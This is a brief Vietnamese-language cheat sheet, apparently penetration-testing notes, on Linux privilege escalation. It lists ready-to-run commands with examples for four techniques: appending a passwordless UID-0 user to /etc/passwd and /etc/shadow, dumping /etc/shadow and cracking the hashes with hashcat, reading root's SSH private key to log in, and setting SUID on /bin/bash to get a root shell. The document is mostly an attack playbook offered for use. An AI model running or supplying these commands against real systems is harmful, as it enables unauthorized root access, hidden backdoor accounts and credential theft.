# Limited Permissions Exploits

### 1. Thêm Người dùng Root Mới

**Lệnh**:

```bash
echo '<user>:x:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
echo '<user>::18985:0:99999:7:::' | sudo tee -a /etc/shadow
```

* Thêm một người dùng mới với UID và GID là 0 (root) vào `/etc/passwd` và `/etc/shadow`.
* Mật khẩu rỗng (không cần mật khẩu để đăng nhập).

**Ví dụ**:

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
echo 'newroot::18985:0:99999:7:::' | sudo tee -a /etc/shadow
```

* Tạo người dùng `newroot` với quyền root, sau đó dùng `su newroot` để đăng nhập.

***

### 2. Đọc Tệp `/etc/shadow`

**Lệnh**:

```bash
cat /etc/shadow
hashcat -a 0 <hash> <wordlist>.txt
```

* Đọc `/etc/shadow` để lấy hàm băm mật khẩu (password hash) và bẻ khóa bằng công cụ như `hashcat`.
* `-a 0`: Chế độ tấn công từ điển (dictionary attack).

**Ví dụ**:

```bash
cat /etc/shadow
hashcat -a 0 hash.txt passwords.txt
```

* Trích xuất hàm băm từ `/etc/shadow` và thử bẻ khóa với danh sách mật khẩu `passwords.txt`.

***

### 3. Truy cập Khóa SSH Riêng

**Lệnh**:

```bash
cat /root/.ssh/id_rsa
ssh -i /root/.ssh/id_rsa <user>@<target_ip>
```

* Đọc khóa SSH riêng (private key) để truy cập trái phép vào hệ thống từ xa.
* Dùng khóa để SSH vào máy mục tiêu với tư cách người dùng tương ứng.

**Ví dụ**:

```bash
cat /root/.ssh/id_rsa
ssh -i /root/.ssh/id_rsa root@localhost
```

* Đọc khóa SSH của root và dùng nó để đăng nhập vào `localhost` với tư cách root.

***

### 4. Thiết lập SUID cho Bash

**Lệnh**:

```bash
chmod u+s /bin/bash
/bin/bash -p
```

* Cấp quyền SUID cho `/bin/bash`, cho phép chạy Bash với đặc quyền của chủ sở hữu (thường là root).
* `-p`: Giữ đặc quyền khi chạy Bash, mở shell root.

**Ví dụ**:

```bash
chmod u+s /bin/bash
/bin/bash -p
```

* Sau khi thiết lập SUID, chạy Bash để nhận shell root.

**Lưu ý Quan trọng**:

* Yêu cầu quyền ghi vào `/etc/passwd`, `/etc/shadow`, hoặc `/bin/bash`, hoặc quyền `sudo` phù hợp để thực hiện các lệnh trên.
* Đảm bảo xác minh hành vi hệ thống trước khi sửa đổi tệp nhạy cảm để tránh làm gián đoạn.
